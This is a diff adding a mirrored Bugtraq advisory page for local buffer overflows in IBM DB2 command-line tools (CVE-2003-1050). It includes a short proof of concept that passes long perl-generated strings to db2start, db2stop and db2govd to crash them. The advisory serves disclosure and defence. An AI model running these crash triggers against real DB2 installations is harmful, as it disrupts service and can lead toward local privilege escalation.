@@ -1,0 +1,109 @@
+#SpeeDr00t@Black Falcon<br>#bid8990<p><b><span style="font-size: 18pt;">IBM DB2 Multiple Command-Line Argument Buffer Overflow Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/8990/info">info</a><br><a href="http://www.securityfocus.com/bid/8990/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/8990/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/8990/solution">solution</a><br><a href="http://www.securityfocus.com/bid/8990/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				8990
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2003-1050<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 07 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 12:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was discovered by SNOSoft.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					IBM DB2 Universal Database for Linux 8.1 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 8.0 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 7.2 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 7.1 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 7.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept has been supplied:<br/>kf@RiotStarter adm$ source /home/db2inst1/sqllib/db2profile<br/>kf@RiotStarter adm$ ./db2start `perl -e 'print "A" x 9901'`<br/>Segmentation fault<br/>kf@RiotStarter adm$ ./db2stop `perl -e 'print "A" x 4001'`<br/>Segmentation fault<br/>db2inst1@RiotStarter adm$ ./db2govd stop a `perl -e 'print "A" x 65'`<br/>Segmentation fault
+	
+		<ul>
+</ul>
+</div>
